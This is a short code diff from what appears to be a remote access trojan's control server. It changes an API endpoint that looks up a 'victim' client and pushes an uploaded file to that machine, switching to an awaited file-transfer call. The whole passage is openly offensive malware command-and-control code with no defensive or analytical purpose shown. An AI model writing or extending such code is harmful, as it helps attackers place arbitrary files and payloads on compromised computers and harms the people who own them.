@@ -64,8 +64,8 @@ async def upload_file(id: str, file: UploadFile = File(...)):
 
             client = RAT_SERVER.instance.clients[victimIndex]
 
-            RAT_SERVER.instance.upload_file(file, client[0])
-            return {"output": "File uploaded successfully"}
+            await RAT_SERVER.instance.transfer_file(victim, file)
+            return {"output": "File transfer started"}
     return {"output": "Error: Client not found"}
 
 
